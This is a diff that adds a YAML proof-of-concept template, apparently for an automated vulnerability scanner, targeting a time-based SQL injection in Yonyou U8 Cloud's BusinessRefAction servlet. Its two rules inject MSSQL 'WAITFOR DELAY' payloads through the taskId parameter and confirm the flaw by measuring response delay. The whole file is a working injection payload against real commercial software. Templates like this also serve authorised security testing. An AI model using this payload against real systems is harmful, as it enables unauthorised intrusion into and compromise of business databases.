@@ -1,0 +1,28 @@
+name: poc-yaml-yongyouU8-Cloud-BusinessRefAction-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:5%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 5000 && response.latency <= 6000
+  r1:
+    request:
+      method: GET
+      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:9%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 9000 && response.latency <= 10000
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486308&idx=1&sn=c1d136e10f1d872216ea42a83702ef32&chksm=c267be57f510374107556630ed5288c91e286341762929e92fb090cfed68120edcbcc89be4f6&token=661111678&lang=zh_CN#rd
+
+
+
